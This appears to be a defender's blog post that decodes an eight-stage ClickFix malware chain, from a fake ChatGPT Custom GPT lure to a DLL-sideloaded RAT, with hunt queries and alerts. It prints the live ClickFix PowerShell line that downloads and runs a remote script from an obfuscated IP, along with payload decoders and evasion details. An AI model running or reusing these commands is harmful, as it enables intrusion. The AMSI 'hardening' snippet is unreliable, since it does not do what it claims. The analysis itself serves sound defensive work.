---
title: The 8-stage ClickFix chain, decoded for defenders
date: 2026-10-05
dek: Huntress caught a ChatGPT Custom GPT pushing a RAT through a Canon-signed DLL sideload. Here is each stage as an example a blue team can hunt for, from the ClickFix paste to the final payload.
tags:
  - blue-team
  - detection
  - ransomware-prep
  - social-engineering
  - dll-sideloading
  - rat
sources:
  - https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
  - https://www.securityweek.com/hackers-use-chatgpt-custom-gpts-in-clickfix-attacks/
  - https://www.scworld.com/news/malicious-chatgpt-custom-gpts-lead-to-clickfix-attack
  - https://attack.mitre.org/techniques/T1574/002/
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1547/001/
---

Most ClickFix chains are two hops: paste a command, download, run it. The one Huntress pulled apart in [September 2026](https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat) has eight stages, and each one exists to hide the next. A victim was steered from a Google ad to a fake ChatGPT "Custom GPT," which handed them a Google Sites page that looked like a Cloudflare CAPTCHA, which told them to paste a PowerShell command. That command kicked off a chain that ended in a full-featured RAT, loaded in memory behind a Canon-signed executable.

This article reads that chain the way defenders have to: not as a story about malware, but as a sequence of observable behaviors. Every stage below is written as an example you can decode, query, or alert on. If you can catch even one link, you break the chain.

## Stage 0: the trust stack

None of this starts with a vulnerability. It starts with three trusted surfaces stacked on top of each other:

1. **A Google ad** paid to sit above the organic results for "chatgpt" — the URL carries `gad_source=1&gad_campaignid=...` tracking parameters.
2. **A ChatGPT Custom GPT** titled *Plus 5.6* so it looks like an actual model. Interact with it and it serves one scripted message: "limited availability on the primary domain, continue through our backup domain."
3. **A Google Sites page** that renders as a Cloudflare CAPTCHA but is actually a ClickFix lure telling you to copy a command into Terminal/Run.

The defense lesson is uncomfortable: each hop is a *legitimate* platform being used as intended. That is why string-blocking domains or product names will not hold — the next wave just wears a new costume. Detection has to live one layer down, in behavior.

## Stage 1: the paste

The ClickFix command the victim runs looks innocuous enough to a glance:

```powershell
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe"
  -ExecutionPolicy Bypass "irm 1614733393/12 | Out-File $env:temp\1777.ps1;& $env:temp\1777.ps1"
```

Two things jump out to an analyst:

- `irm` (Invoke-RestMethod) reaches *out* — PowerShell is fetching a remote resource and writing it to disk. Downloading to `%TEMP%` and immediately executing is the pattern.
- The host is a **decimal integer**, `1614733393`, not a dotted IP. Windows happily resolves that to `96.62.224.81` internally, but a filter that looks for dotted-quad IPs never sees one. This is a deliberate evasion.

**Blue-team example — the parent/child process tree.** In Sysmon or your EDR, the signal is the *relationship*, not the command. A huntable chain looks like:

```
powershell.exe (PID A)  →  invokes a remote script via irm/iwr
    └── NEW powershell.exe (PID B)  →  downloads  <32-hex>_ISOSimple.msi to %TEMP%
          └── msiexec.exe /i <msi> /qn /norestart   ← silent, installs immediately
```

An alert worth writing: *parent = powershell.exe, child = msiexec.exe, command line contains an MSI path under %TEMP% and /qn /norestart.*

## Stage 2: the script that isn't what it seems

The `.ps1` that lands in `%TEMP%` is a single 27,581-character line. Almost all of it is one array of 3,036 **negative integers**. Each integer is one character of the real script, shifted by a fixed key:

```python
# Layer 1: recover the script by adding 1,520,498 to every value,
# converting to chars, then executing in-memory with [scriptblock]::Create.
# The decoded code never touches disk — nothing for AV toscan in a file.

portions = [ -1520498, -1520490, ... ]  # 3,036 entries
shift    = 1520498
script   = "".join(chr(v + shift) for v in portions)
# execute: [scriptblock]::Create(script).Invoke()
```

Strip that layer and you still do not get readable code. Every string a scanner would grep for — the download URL, `Net.WebClient`, `DownloadFile` — is itself re-encoded with a second key, `6178128`, in its own small integer array. Pure PowerShell syntax is the only plain text left. Decode that and you get a short script that: forces TLS 1.2 (cosmetic — the MSI comes over plain HTTP), downloads the MSI from the same decimal-IP host, and installs it silently.

**Blue-team example — the file name.** The MSI is saved under a fresh GUID every run, so it never has the same name twice: `%TEMP%\` + 32 hex chars + `_ISOSimple.msi`. Hunting by filename is a losing game. Hunting by the *pattern* `%TEMP%\<32-hex>_*.msi` launched from a script is a winning one.

## Stage 3: the "printer driver" that isn't

`ISOSimple.msi` presents as **"Advanced Printer Configuration Reader"** from a publisher called *Softplicity*. Two MSI properties make it quiet:

- `ARPSYSTEMCOMPONENT=1` hides it from *Programs and Features* — the user who goes looking for what they just ran won't find it.
- A **custom action launches `COTFileReadApp.exe` the moment installation finishes** — nothing waits for reboot or logon.

Of the package's 177 files, only eight matter. Seven are genuine Canon CaptureOnTouch code, a full .NET 5 runtime, and set dressing (a DOS 6.22 floppy image, a help file, an MIT license). The interesting ones:

| File | What it actually is |
|---|---|
| `COTFileReadApp.exe` | Legit Canon-signed host process |
| `ceiinfolog.dll` | A real Canon logging DLL, **patched** — signature stripped, one extra import |
| `rdCore.dll` | Malicious, unsigned; extracts & runs the loader from the `.wav` |
| `Common.Integrator.Preview.wav` | Audio file carrying the encrypted loader |
| `monitor.raw` | Encrypted archive holding persistence script + RAT |

## Stage 4: DLL sideloading — the Trojan horse that doesn't move

`COTFileReadApp.exe` is genuinely Canon code. Its companion DLL calls into Canon's logging library, `ceiinfolog.dll`. Here's the rule that makes the whole attack work:

> When a program asks for a DLL by name, Windows checks the **program's own folder first**. Whatever sits next to the EXE with the right name gets loaded.

That's [DLL sideloading (T1574/002)](https://attack.mitre.org/techniques/T1574/002/). The patched `ceiinfolog.dll` looks real because it mostly is — its debug path points into Canon's own build tree, its timestamp is 2015, it exports the logging functions Canon's code calls. But its signature is gone, **its header checksum no longer matches its contents**, and its import table has one entry a logging library has no business with:

```
ceiinfolog.dll  →  imports  rdCore.dll!instance_levels_
```

Windows loads every import on the table before the DLL's own code runs. So the moment the Canon app loads its *logger*, the malicious `rdCore.dll` comes along for the ride. Nothing in Canon's code had to change.

**Blue-team example — the signature check that most teams skip.** A signed EXE is not a signed *directory*. The weakness is the *neighboring* DLL. Detection:

```powershell
# Find a signed, known-good EXE in a fake product folder sitting next to
# an UNSIGNED or checksum-mismatched DLL of the same name.
Get-ChildItem -Path "$env:LOCALAPPDATA\Programs" -Recurse -Filter *.dll |
  Get-AuthenticodeSignature |
  Where-Object { $_.Status -ne 'Valid' } |
  Select-Object Path, Status
```

An alert worth writing: *`COTFileReadApp.exe` running from `%LOCALAPPDATA%\Programs\` — not from a real Canon install.*

## Stage 5: the music that isn't music

`rdCore.dll` opens `Common.Integrator.Preview.wav`, and the file *looks* like audio — valid RIFF/WAVE header, 16-bit stereo PCM at 22,050 Hz, real audio at the top. Then it falls apart: the header claims ~700 KB but the file is over 1 MB, and partway through [at offset `0x24362`] the smooth samples turn to random noise. That noise is encrypted loader.

The loader thread:

1. Loads helper `WMPCL.dll`
2. Seeks to `0x24362`, reads **341,395 bytes**
3. XOR-decodes them with a **rolling single-byte XOR** — counters stirred on every byte so each byte is XORed with a different value and no static key sits in the file
4. Copies the result to executable memory and runs it

Huntress reimplemented the decoder in a few lines:

```python
r8, r9 = 4, 0x13
for i in range(len(buf)):
    r9 = (r9 + i + 0x23) & 0xFFFFFFFF
    r8 = (r8 * 2 + 9) & 0xFFFFFFFF
    r9 = (r9 + i * 2) & 0xFFFFFFFF
    buf[i] ^= (r8 + 0x23 + r9) & 0xFF
```

Run that over the 341,395 bytes and the noise becomes x64 shellcode. Strictly this is *not* steganography — real audio steganography hides data in low bits so the file still sounds normal. Here the attackers overwrote a stretch of a real recording with ciphertext. It gets past anything that inherently trusts file headers, which is most automated tooling.

## Stage 6: in-memory evasion

The decoded bytes are 341 KB of **position-independent x64 shellcode** — raw machine code with no EXE wrapper. There isn't a single readable string in it; every string is assembled on the stack at runtime and decrypted with a small PRNG, so `strings` and signature scanners come up empty. Among the recovered behaviors:

- **AMSI bypass** aimed at `amsi.dll` — blinds the Windows interface that lets AV inspect scripts and .NET in memory
- **CLR hosting** (v4.0.30319) — runs .NET code from memory without dropping an assembly to disk
- **`ntdll` unhooking** — maps a fresh copy to dodge EDR hooks
- **Anti-VM checks** against CPU vendor strings and VMware/VirtualBox/Hyper-V/QEMU/Xen/Parallels drivers

**Blue-team example.** Because this stage only exists in memory, you cannot hash it off disk — you have to watch *events*. PowerShell **ScriptBlock logging** and AMSI are precisely the layers this attack tries to blind. Hardening that actually pays off:

```powershell
# Enable bidirectional script block logging + AMSI if not already on
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name EnableScriptBlockLogging -Value 1
New-ItemProperty -Path "HKLM:\Software\Microsoft\AMSI\Providers" -Name "*" -ErrorAction SilentlyContinue
```

And log *every* `wav`/media file touched by a native-process (non-browser) child of a script-host — media files should not be opened by roaming shellcode.

## Stage 7: dual persistence — the self-healing backdoor

The loader's real job is to open `monitor.raw`, an **encrypted archive** with its own folder tree — essentially a homemade encrypted zip: a header, an index of 1,128 entries (each recording parent, size, and a *per-file* key), then file contents packed back to back. Master key `0x26ace8d1`, each entry scrambled with a salt, each file XOR'd with its own one-byte key on top. Once decrypted: **315 folders, 806 files** — mostly tiny flag/setting files — plus one plain-text script in the malware's own scripting language.

That script is where persistence lives, and it's engineered to be **hard to remove**:

```
Every 150 seconds:  check HKCU Run value "Canon Configuration Reader";
                    re-create it if missing
Every 875 seconds:  check scheduled task "Canon Configuration Reader";
                    re-create it if missing
On shutdown:        write the Run key one more time
```

Both the Run value and the scheduled task launch `COTFileReadApp.exe`, and both share one name. That makes cleanup order matter:

> **Delete one while the implant runs and the script puts it back within minutes. Kill the process first, then remove both.**

**Blue-team example.** Watch for *two different persistence mechanism names colliding*, and for self-repair:

```powershell
# Two persistence points under ONE name, then ask the host to invent more:
$run = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$run | Select-Object -Property * | Where-Object { $_ -match 'Configuration Reader' }

# Scheduled task with the same name is the tell — normal software does not
# mirror its Run key into a scheduled task with the identical string.
Get-ScheduledTask | Where-Object { $_.TaskName -match 'Configuration Reader' }
```

An alert worth writing: *Run key + scheduled task sharing one non-system name, pointing into %LOCALAPPDATA%\Programs*. And if a defensive removal of one is followed by its reappearance within minutes, treat it as active-compromise, not as persistence you've already cleaned.

## Stage 8: the payload

`@input` in the archive is the final payload: 1.58 MB of shellcode, same toolchain as the loader, ~1,500 recovered strings describing a full RAT:

- Remote desktop sessions, screen "broadcasts," camera/microphone/system-audio capture
- Data from **17 browsers** (Chrome, Edge, Yandex, Arc…)
- Content search engine across the whole host
- Can drop and run follow-on payloads in **9 formats** — EXE, DLL (via `rundll32`/`regsvr32`), MSI, PowerShell, Batch, VBScript, JScript, ZIP, or URL download — silently
- Scours the host first: installed AV (WMI), Defender status, domain/DC, adapters, open ports, installed software, a hardware fingerprint doubling as anti-VM check
- Reaches its C2 ("the Gate") via **DNS-over-HTTPS** (Cloudflare, Google, Quad9) so lookups ride ordinary HTTPS to well-known resolvers and never appear in local DNS logs

On the investigated hosts the RAT's next move was usually to drop a legitimately signed `GOMCam2024.exe` (GOM & Company) into `%LOCALAPPDATA%\AppstorageFile\`, then launch `chrome.exe` with a throwaway profile under `%TEMP%` — the payload/browser-launch features turned on follow-on malware.

## The version-two lesson: names are costumes

When the first Custom GPT came down, a second appeared. Same RAT byte-for-byte. What changed was all wrapping paper:

- Signed host: Canon → **Stardock `DeElevate64.exe`**
- Sideloaded DLL: `ceiinfolog.dll` → **`DeElevator64.dll`** (same patch, one extra import)
- Loader carrier: `.wav` → a real **Microsoft NuGet package** (`Build.dat`), the loader wedged into the compressed data of a DLL so there's no "real audio then noise" jump to give it away
- Obfuscation: freshly re-obfuscated on every request — hashes worthless as IOCs
- Delivery: strips the **Mark-of-the-Web** (the hidden tag that triggers SmartScreen) so the MSI runs as if it had always been on disk

**Detections tied to Canon or Stardock names will miss the next swap.** The *behaviors* carry over, and those are the hunt targets:

- PowerShell → `msiexec` on a GUID-named MSI in `%TEMP%`
- A signed EXE launched by `msiexec` from a fake product folder under `%LOCALAPPDATA%\Programs\`
- One Run value + one scheduled task sharing a name, coming back when deleted
- A signed host sideloading an unsigned or checksum-mismatched DLL from its own folder

## The IOC you can actually keep

Hashes rot the moment the attacker re-obfuscates. The durable framing is behavioral. Keep these as **huntable process relationships and persistence collisions** rather than hash lists:

- `powershell.exe` parent → `msiexec.exe` child, MSI in `%TEMP%`, `/qn /norestart`
- Signed app running from `%LOCALAPPDATA%\Programs\` (non-vendor-installed path)
- `%TEMP%\<32 hex>_*.msi` pattern from any script host
- Run value + scheduled task sharing a name, self-repairing
- Signed EXE adjacent to an unsigned/checksum-mismatched DLL

Huntress found at least 40 incidents from this campaign's Google Sites domain — so this is not a theoretical writeup. It is one chain, decoded into the points where a blue team can actually react. Catch any single stage and the RAT never lands.

## Recommendations

- Alert on the process relationship, not the command: `powershell.exe` parent → `msiexec.exe` child with an MSI in `%TEMP%` and `/qn /norestart` is a chain worth blocking regardless of the file name.
- Treat a signed EXE as a signed directory only if you also verify its neighbors: alert when a known-good signed host runs from `%LOCALAPPDATA%\Programs\` next to an unsigned or header-checksum-mismatched DLL.
- Hunt persistence collisions, not single artifacts: a Run value and a scheduled task that share one non-system name and point into a fake product folder is the tell — and if a removal is undone within minutes, kill the process before deleting both points.
- Do not rely on hash or filename IOCs — this campaign re-obfuscates per request and swaps signed hosts (Canon → Stardock). Build detections on the behaviors that carried over across both versions, including a media or package file being read by a non-browser process.
- Enable and monitor PowerShell ScriptBlock logging and AMSI; this chain's in-memory stages are precisely the layers it tries to blind.

*All samples and technique details from the linked Huntress analysis; MITRE mappings added for T1059/001 (PowerShell), T1574/002 (DLL side-loading), and T1547/001 (registry run keys).*